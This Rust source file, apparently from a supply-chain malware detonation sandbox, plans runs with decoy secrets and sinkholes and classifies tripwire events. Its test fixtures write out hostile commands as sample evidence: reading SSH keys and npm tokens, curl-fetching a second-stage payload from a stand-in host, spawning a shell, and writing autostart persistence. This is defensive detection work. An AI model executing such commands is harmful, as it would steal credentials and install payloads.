use chrono::Utc;

use crate::types::{
    ArtifactCoordinate, DetectionSeverity, DetonationPersona, DetonationPlan, DetonationScenario,
    EvidenceEvent, EvidenceRecord, PackageLifecyclePhase, TripwireKind, Verdict,
};

#[derive(Debug, Default)]
pub struct LabPlanner;

impl LabPlanner {
    pub fn plan(artifact: ArtifactCoordinate) -> DetonationPlan {
        DetonationPlan {
            artifact,
            personas: vec![
                DetonationPersona::DeveloperWorkstation,
                DetonationPersona::CiRunner,
                DetonationPersona::ContainerBuildNode,
                DetonationPersona::CloudOperator,
            ],
            scenarios: vec![
                DetonationScenario::InstallBuild,
                DetonationScenario::ImportLoad,
                DetonationScenario::CliSmoke,
                DetonationScenario::WarmCache,
                DetonationScenario::ColdCache,
                DetonationScenario::DelayedRerun,
                DetonationScenario::BaitedVsSterile,
            ],
            decoys: vec![
                "~/.ssh/id_ed25519".to_string(),
                "~/.aws/credentials".to_string(),
                "~/.kube/config".to_string(),
                "~/.npmrc".to_string(),
                "~/.pypirc".to_string(),
                "~/.cargo/credentials.toml".to_string(),
                "/var/run/docker.sock.fake".to_string(),
                "169.254.169.254".to_string(),
            ],
            sinkholes: vec![
                "dns://wildcard.internal".to_string(),
                "https://sinkhole.zitpit.invalid".to_string(),
                "tcp://exfil.zitpit.invalid:443".to_string(),
            ],
            objectives: vec![
                "capture any outbound second-stage fetch".to_string(),
                "detect decoy secret touches".to_string(),
                "compare sterile and baited behavior".to_string(),
                "generate replayable evidence".to_string(),
            ],
        }
    }
}

#[derive(Debug, Default)]
pub struct TripwireEvaluator;

impl TripwireEvaluator {
    pub fn evaluate(
        artifact: ArtifactCoordinate,
        persona: DetonationPersona,
        scenario: DetonationScenario,
        events: Vec<EvidenceEvent>,
    ) -> EvidenceRecord {
        let mut tripwires = events.iter().map(|event| event.kind).collect::<Vec<_>>();
        tripwires.sort();
        tripwires.dedup();

        let verdict = if tripwires.iter().any(|kind| is_malicious_tripwire(*kind)) {
            Verdict::Malicious
        } else if tripwires.len() >= 2 {
            Verdict::Malicious
        } else if tripwires.is_empty() {
            Verdict::Clean
        } else {
            Verdict::Suspicious
        };

        EvidenceRecord {
            artifact,
            persona,
            scenario,
            started_at: Utc::now(),
            verdict,
            tripwires,
            replay_recipe: vec![
                "cold-cache run".to_string(),
                "baited persona rerun".to_string(),
                "delayed rerun after 10 minutes".to_string(),
            ],
            events,
        }
    }

    pub fn sample_suspicious_run(artifact: ArtifactCoordinate) -> EvidenceRecord {
        Self::evaluate(
            artifact,
            DetonationPersona::DeveloperWorkstation,
            DetonationScenario::InstallBuild,
            vec![
                EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::HoneySecretAccess,
                    subject: "~/.ssh/id_ed25519".to_string(),
                    detail: "package attempted to read fake SSH private key".to_string(),
                    severity: DetectionSeverity::Critical,
                    phase: Some(PackageLifecyclePhase::Install),
                    process_lineage: vec![
                        "npm install".to_string(),
                        "node postinstall.js".to_string(),
                    ],
                    command: Some("cat ~/.ssh/id_ed25519".to_string()),
                    file_path: Some("~/.ssh/id_ed25519".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("scrape_ssh_key".to_string()),
                    canary_id: Some("fake-ssh-key".to_string()),
                    attack_family_tag: None,
                },
                EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::Downloader,
                    subject: "https://cdn.bad.invalid/payload".to_string(),
                    detail: "installer tried to fetch second stage payload".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(PackageLifecyclePhase::Install),
                    process_lineage: vec![
                        "npm install".to_string(),
                        "node postinstall.js".to_string(),
                    ],
                    command: Some("curl https://cdn.bad.invalid/payload".to_string()),
                    file_path: None,
                    network_target: Some("cdn.bad.invalid".to_string()),
                    network_protocol: Some("https".to_string()),
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("fetch_second_stage".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                },
                EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::ShellSpawn,
                    subject: "/bin/sh -c curl https://cdn.bad.invalid/payload".to_string(),
                    detail: "install hook spawned a shell".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(PackageLifecyclePhase::Install),
                    process_lineage: vec![
                        "npm install".to_string(),
                        "node postinstall.js".to_string(),
                    ],
                    command: Some("/bin/sh -c curl https://cdn.bad.invalid/payload".to_string()),
                    file_path: None,
                    network_target: Some("cdn.bad.invalid".to_string()),
                    network_protocol: Some("https".to_string()),
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("spawn_shell".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                },
            ],
        )
    }
}

fn is_malicious_tripwire(kind: TripwireKind) -> bool {
    matches!(
        kind,
        TripwireKind::HoneySecretAccess
            | TripwireKind::MetadataProbe
            | TripwireKind::Downloader
            | TripwireKind::ShellSpawn
            | TripwireKind::SecretScrape
            | TripwireKind::Persistence
            | TripwireKind::ContainerSocketTouch
            | TripwireKind::ArchiveStaging
            | TripwireKind::ExfilAttempt
            | TripwireKind::PortScan
            | TripwireKind::BrowserTokenScrape
            | TripwireKind::InternalGitCredentialAccess
            | TripwireKind::PackageCredentialAccess
            | TripwireKind::KubeTokenEnumeration
            | TripwireKind::SshAgentTouch
            | TripwireKind::GitHookWrite
            | TripwireKind::ProcessInjectionAttempt
            | TripwireKind::GitRefDrift
            | TripwireKind::ReleaseArtifactMismatch
            | TripwireKind::SubmoduleRewrite
            | TripwireKind::RepoIdentityDrift
            | TripwireKind::CommandBlocked
            | TripwireKind::SecretReadDenied
            | TripwireKind::BrowserStateDenied
            | TripwireKind::RepoOpenDenied
            | TripwireKind::NetworkEgressDenied
            | TripwireKind::ReconDenied
            | TripwireKind::PersistenceWriteDenied
            | TripwireKind::DestructiveOpDenied
            | TripwireKind::PublishAttemptDenied
            | TripwireKind::PrivateKeyEgressDenied
            | TripwireKind::CredentialEgressDenied
            | TripwireKind::RegulatedDataEgressDenied
            | TripwireKind::SourceIpEgressDenied
            | TripwireKind::SensitivePayloadRedacted
    )
}

#[cfg(test)]
mod tests {
    use crate::types::{
        ArtifactCoordinate, DetectionSeverity, DetonationPersona, DetonationScenario, Ecosystem,
        EvidenceEvent, PackageLifecyclePhase, SelectorKind, TripwireKind, Verdict,
    };
    use chrono::Utc;

    use super::{LabPlanner, TripwireEvaluator};

    fn artifact() -> ArtifactCoordinate {
        ArtifactCoordinate {
            ecosystem: Ecosystem::Archive,
            source: "https://github.com/acme/tool/releases/download/v2.0.0/tool.tar.gz".to_string(),
            requested_selector: "v2.0.0".to_string(),
            selector_kind: SelectorKind::Tag,
        }
    }

    #[test]
    fn lab_plan_contains_all_core_personas() {
        let plan = LabPlanner::plan(artifact());
        assert_eq!(plan.personas.len(), 4);
        assert!(plan.decoys.iter().any(|item| item.contains(".ssh")));
    }

    #[test]
    fn honey_secret_access_marks_run_malicious() {
        let evidence = TripwireEvaluator::sample_suspicious_run(artifact());
        assert_eq!(evidence.verdict, Verdict::Malicious);
        assert!(
            evidence
                .tripwires
                .iter()
                .any(|kind| matches!(kind, crate::types::TripwireKind::HoneySecretAccess))
        );
    }

    #[test]
    fn common_exploit_tripwires_are_elevated_to_malicious() {
        let cases = [
            (
                DetonationScenario::InstallBuild,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::SecretScrape,
                    subject: "~/.npmrc".to_string(),
                    detail: "fake npm token read".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(PackageLifecyclePhase::Install),
                    process_lineage: vec!["npm install".to_string()],
                    command: Some("cat ~/.npmrc".to_string()),
                    file_path: Some("~/.npmrc".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("read_npmrc".to_string()),
                    canary_id: Some("fake-npm-token".to_string()),
                    attack_family_tag: None,
                }],
            ),
            (
                DetonationScenario::CliSmoke,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::Persistence,
                    subject: "~/.config/autostart/zitpit.desktop".to_string(),
                    detail: "attempted autostart persistence".to_string(),
                    severity: DetectionSeverity::Medium,
                    phase: Some(PackageLifecyclePhase::Cli),
                    process_lineage: vec!["./zitpit".to_string()],
                    command: Some("tee ~/.config/autostart/zitpit.desktop".to_string()),
                    file_path: Some("~/.config/autostart/zitpit.desktop".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("persist_autostart".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                }],
            ),
            (
                DetonationScenario::ColdCache,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::ContainerSocketTouch,
                    subject: "/var/run/docker.sock".to_string(),
                    detail: "attempted to open container socket".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(PackageLifecyclePhase::Import),
                    process_lineage: vec!["python -c import evil".to_string()],
                    command: Some("open /var/run/docker.sock".to_string()),
                    file_path: Some("/var/run/docker.sock".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("touch_docker_socket".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                }],
            ),
            (
                DetonationScenario::DelayedRerun,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::ArchiveStaging,
                    subject: "/tmp/stage/payload.tar.gz".to_string(),
                    detail: "repacked payload for second stage".to_string(),
                    severity: DetectionSeverity::Medium,
                    phase: Some(PackageLifecyclePhase::DelayedRerun),
                    process_lineage: vec!["python delayed.py".to_string()],
                    command: Some("tar -czf /tmp/stage/payload.tar.gz payload".to_string()),
                    file_path: Some("/tmp/stage/payload.tar.gz".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("stage_archive".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                }],
            ),
        ];

        for (scenario, events) in cases {
            let evidence = TripwireEvaluator::evaluate(
                artifact(),
                DetonationPersona::DeveloperWorkstation,
                scenario,
                events,
            );
            assert_eq!(
                evidence.verdict,
                Verdict::Malicious,
                "scenario {scenario:?} should be flagged"
            );
        }
    }

    #[test]
    fn new_hard_ban_tripwires_mark_run_malicious() {
        let cases = [
            TripwireKind::PortScan,
            TripwireKind::BrowserTokenScrape,
            TripwireKind::InternalGitCredentialAccess,
            TripwireKind::PackageCredentialAccess,
            TripwireKind::KubeTokenEnumeration,
            TripwireKind::SshAgentTouch,
            TripwireKind::GitHookWrite,
            TripwireKind::ProcessInjectionAttempt,
            TripwireKind::GitRefDrift,
            TripwireKind::ReleaseArtifactMismatch,
            TripwireKind::SubmoduleRewrite,
            TripwireKind::RepoIdentityDrift,
            TripwireKind::CommandBlocked,
            TripwireKind::SecretReadDenied,
            TripwireKind::NetworkEgressDenied,
            TripwireKind::PersistenceWriteDenied,
            TripwireKind::DestructiveOpDenied,
            TripwireKind::PublishAttemptDenied,
        ];

        for kind in cases {
            let evidence = TripwireEvaluator::evaluate(
                artifact(),
                DetonationPersona::DeveloperWorkstation,
                DetonationScenario::CliSmoke,
                vec![EvidenceEvent {
                    timestamp: Utc::now(),
                    kind,
                    subject: "synthetic-subject".to_string(),
                    detail: "synthetic detail".to_string(),
                    severity: DetectionSeverity::High,
                    phase: Some(PackageLifecyclePhase::Cli),
                    process_lineage: vec!["./synthetic".to_string()],
                    command: Some("./synthetic".to_string()),
                    file_path: None,
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("synthetic".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                }],
            );
            assert_eq!(evidence.verdict, Verdict::Malicious, "{kind:?}");
        }
    }

    #[test]
    fn combined_soft_tripwires_escalate_to_malicious() {
        let evidence = TripwireEvaluator::evaluate(
            artifact(),
            DetonationPersona::DeveloperWorkstation,
            DetonationScenario::CliSmoke,
            vec![
                EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::EnvMassEnumeration,
                    subject: "env".to_string(),
                    detail: "enumerated many env vars".to_string(),
                    severity: DetectionSeverity::Medium,
                    phase: Some(PackageLifecyclePhase::Cli),
                    process_lineage: vec!["./tool".to_string()],
                    command: Some("env".to_string()),
                    file_path: None,
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("enum_env".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                },
                EvidenceEvent {
                    timestamp: Utc::now(),
                    kind: TripwireKind::SandboxFingerprinting,
                    subject: "/sys/class/dmi/id/product_name".to_string(),
                    detail: "checked for virtualization".to_string(),
                    severity: DetectionSeverity::Medium,
                    phase: Some(PackageLifecyclePhase::Cli),
                    process_lineage: vec!["./tool".to_string()],
                    command: Some("cat /sys/class/dmi/id/product_name".to_string()),
                    file_path: Some("/sys/class/dmi/id/product_name".to_string()),
                    network_target: None,
                    network_protocol: None,
                    sinkhole_transcript_sha256: None,
                    scenario_step: Some("fingerprint_sandbox".to_string()),
                    canary_id: None,
                    attack_family_tag: None,
                },
            ],
        );
        assert_eq!(evidence.verdict, Verdict::Malicious);
    }
}
